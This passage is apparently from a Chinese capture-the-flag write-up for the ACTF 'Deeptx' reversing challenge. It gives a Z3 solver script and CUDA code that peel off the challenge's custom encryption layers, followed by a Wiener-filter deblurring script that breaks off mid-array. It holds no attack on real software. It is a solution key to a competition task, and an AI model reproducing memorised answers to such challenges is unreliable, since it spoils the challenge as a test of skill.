class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_input</span>(<span class="params">vArray,Size</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line"></span><br><span class="line">    Input = [[BitVec(<span class="string">f&#x27;input_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bid <span class="keyword">in</span> <span class="built_in">range</span>(Size):</span><br><span class="line">        <span class="keyword">for</span> tid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            tmp = sbox[tid]</span><br><span class="line">            <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="built_in">sum</span> += (tbox[tmp&amp;<span class="number">0xff</span>] * Input[bid][i])&amp;<span class="number">0xffff</span></span><br><span class="line">                tmp = (tmp*<span class="number">5</span>+<span class="number">17</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">            s.add(<span class="built_in">sum</span> == vArray[bid*<span class="number">256</span>+tid])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        model = s.model()</span><br><span class="line">        result = [[model.evaluate(Input[i][j]).as_long() </span><br><span class="line">                  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] </span><br><span class="line">                  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Size)]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg2&#x27;</span> , <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read(<span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;Steg3_part&#x27;</span>+<span class="built_in">str</span>(num),<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">    start = num * <span class="number">16</span> * <span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Running...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        block = data[start + i * <span class="number">256</span> : start + i * <span class="number">256</span> + <span class="number">256</span> * <span class="number">1</span>]</span><br><span class="line">        In_ = [b <span class="keyword">for</span> b <span class="keyword">in</span> block]</span><br><span class="line">        </span><br><span class="line">        result = solve_input(In_, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">                out_f.write(<span class="built_in">bytes</span>(row))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Finished &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; block&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Finished all.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后Layer3前半部分解密+Layer2解密cuda代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">readFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">uint8_t</span>* buffer, <span class="type">size_t</span> startPos, <span class="type">size_t</span> bufferSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">seekg</span>(startPos);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">read</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(buffer), bufferSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> std::string&amp; filename, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ofstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size);</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line">    <span class="comment">// 读取16块解密数据合并</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">readFile</span>(<span class="string">&quot;Steg3_part&quot;</span> + std::<span class="built_in">to_string</span>(i),Input + i * <span class="number">16</span> * <span class="number">256</span>, <span class="number">0</span>, <span class="number">0x10000</span> / <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    Re_Layer2 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (OutPtr, InPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, InPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Layer2_Decrypted&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到Layer1加密后的图片，是经过动态模糊卷积后的，不可完全逆向，只能用算法进行清晰化处理。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-2.png" alt="alt text"></p><p>去模糊代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblur_image</span>(<span class="params">blurred_image, motion_kernel, num_iterations=<span class="number">30</span>, learning_rate=<span class="number">0.01</span></span>):</span><br><span class="line">    kernel = motion_kernel.reshape(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    padded_kernel = np.zeros((<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">    padded_kernel[:<span class="number">16</span>, :<span class="number">16</span>] = kernel</span><br><span class="line">    kernel_fft = np.fft.fft2(padded_kernel)</span><br><span class="line">    blurred_fft = np.fft.fft2(blurred_image)</span><br><span class="line">    K = <span class="number">0.01</span></span><br><span class="line">    kernel_fft_conj = np.conj(kernel_fft)</span><br><span class="line">    deblurred_fft = (kernel_fft_conj * blurred_fft) / (np.<span class="built_in">abs</span>(kernel_fft)**<span class="number">2</span> + K)</span><br><span class="line">    deblurred = np.real(np.fft.ifft2(deblurred_fft))</span><br><span class="line">    deblurred = np.clip(deblurred, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> deblurred.astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_and_process_image</span>(<span class="params">image_path, motion_data</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    img_array = np.array(img)</span><br><span class="line">    motion_kernel = np.array(motion_data)</span><br><span class="line">    deblurred_img = deblur_image(img_array, motion_kernel)</span><br><span class="line">    <span class="keyword">return</span> deblurred_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    motion_data = np.array([</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span 